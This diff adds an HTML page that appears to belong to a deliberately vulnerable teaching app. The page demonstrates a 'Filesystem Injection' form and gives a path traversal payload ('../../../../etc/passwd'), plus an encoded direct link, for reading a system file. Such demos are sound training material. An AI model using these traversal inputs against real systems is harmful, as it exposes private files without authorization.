@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Filesystem Injection</title>
+    <style type="text/css">.tt { font-family: monospace; }</style>
+  </head>
+  <body>
+    <h1>Filesystem Injection</h1>
+    <form action="filesystem.php">
+      <table>
+        <tr><td>File to retrieve:</td><td><input type="text" name="file"/></td></tr>
+        <tr><td>                 </td><td><input type="submit"          /></td></tr>
+      </table>
+    </form>
+    <h2>How to use</h2>
+    <p>
+      Enter the filename "<span class="tt">file1</span>"
+      to show how the tool should work.
+    </p>
+    <h3>Hacking in</h3>
+    <p>Enter the following filename:</p>
+    <p class="tt">../../../../../../../etc/passwd</p>
+    <p><a href="filesystem.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd">Direct link</a></p>
+    <p><a href="menu.html">Back to menu</a></p>
+  </body>
+</html>
